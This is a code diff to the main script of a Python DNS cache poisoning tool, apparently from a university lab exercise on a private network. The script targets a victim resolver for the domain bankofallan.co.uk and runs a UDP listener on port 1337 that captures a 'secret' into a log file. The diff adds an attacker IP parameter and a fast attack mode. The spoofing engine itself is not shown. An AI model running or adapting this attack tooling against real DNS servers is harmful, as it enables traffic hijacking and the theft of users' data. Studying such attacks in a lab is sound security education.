@@ -3,12 +3,11 @@
 ## @package Main
 #   This package is responsible to execute all the passage required for the attack
 #
+
 import dns.resolver
 from dns.resolver import NoAnswer
 
 import multiprocessing
-import random #For generating random ID
-
 import time
 import socket
 import sys
@@ -37,6 +36,7 @@ log_file = "log_secret.txt"
 #
 #   @brief The fuction used for output messages
 #   @param msg The message to display
+#   Verbosity can be set in order to suppres the output
 #
 def log(msg):
     if verbosity > 0:
@@ -54,6 +54,12 @@ def sigint_handler(sig, frame):
     print("Exiting...")
     sys.exit(0)
 
+##
+#       @brief Routine that fetch the secret
+#
+#       Start a small UDP server which listen on port 1337 for the secret.\n
+#       It also write the secret into the log_file file.
+#
 def secret_fetcher(server_ip, server_port):
     try:
         secret_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
@@ -79,16 +85,17 @@ def secret_fetcher(server_ip, server_port):
                 return
                 
 
-def launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, number_of_tries=None, \
+def launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, attacker_ip, number_of_tries=None, \
         blessing_terminal=None, sigint_handler=None, log_function=None):
 
-        attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, \
+        attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port,\
+                 attacker_ip,\
                 blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)
 
         if number_of_tries == None:
                 number_of_tries=50
 
-        attack.start(number_of_tries) 
+        attack.start(number_of_tries, mode=DNSAttack.Mode.FAST) 
 
 
 
@@ -97,6 +104,7 @@ def main():
         print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))
 
         victim_server_ip = '192.168.56.3'
+        attacker_ip = '192.168.56.1'
         domain = 'bankofallan.co.uk'
         #Bad Guy
         bad_udp_port = 55553
@@ -107,14 +115,8 @@ def main():
         secret_thread = Thread(target=secret_fetcher, args = (bad_udp_ip, 1337))
         secret_thread.start()
 
-        #Use processes instead of Threads for better managment
-
-        #args = [victim_server_ip, domain, bad_udp_ip, bad_udp_port, 50 , term, sigint_handler, log]
-
         try:
-                #attack_pool = Pool()    #Use every CPU
-                #attack_pool.map(launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, 50 , term, sigint_handler, log), range(4) )
-                launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, 50 , term, sigint_handler, log)
+                launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, attacker_ip ,number_of_tries=30 , blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)
         except DNSAttack.CriticalError:
                 print("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating".format(t=term))
         except DNSAttack.SuccessfulAttack:
